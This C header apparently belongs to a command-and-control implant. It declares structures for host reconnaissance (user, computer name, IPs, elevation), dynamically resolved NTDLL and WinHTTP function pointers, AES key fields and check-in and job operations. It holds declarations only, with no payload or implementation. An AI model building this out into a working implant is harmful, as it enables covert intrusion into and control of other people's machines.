#pragma once
#include "Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {


	//enumeration apis
	//NTDLL APIS
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;

	
	//KERNEL32 APIS
	t_GetComputerNameExA pGetComputerNameExA;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;

	//agent metadata
	UINT32 AgentID;
	char EndPoint[256];

	//current context info
	PContextInfo Context;


	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* packages;
	



}Agent, * pAgent;



enum Agent_Operations {
	INITIALIZE_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
};


INT init_agent(pAgent agent);
INT RegisterAgent(pAgent agent);
BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength);
void AgentMain();